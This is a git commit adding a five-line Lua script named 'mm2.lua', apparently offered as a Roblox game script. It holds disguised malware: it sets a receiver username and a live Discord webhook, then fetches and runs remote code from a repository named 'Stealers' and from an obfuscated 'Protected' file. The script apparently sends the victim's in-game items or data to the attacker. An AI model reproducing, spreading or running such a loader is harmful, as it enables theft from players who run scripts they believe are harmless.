30a49b7b873bbaec33400ca0ea9cc26276429106
main <princeaivher06@gmail.com>
2024-10-27 10:32:29 +0800

    mm2.lua

---
+++ mm2.lua
@@ -0,0 +1,5 @@
+Receiver = "jackkrrhahahhaHa"
+Webhook = "https://discord.com/api/webhooks/1299921165980274762/MxHAy96-cPkvD1TlTvpfWnBWJ7ayp9P0-DWNzuRffj7k5hNPmbB8WPts4ZEzL_swiza_"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/refs/heads/main/losg.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eZscripts999/guiiiii/refs/heads/main/Protected_4418461450530531.txt"))()
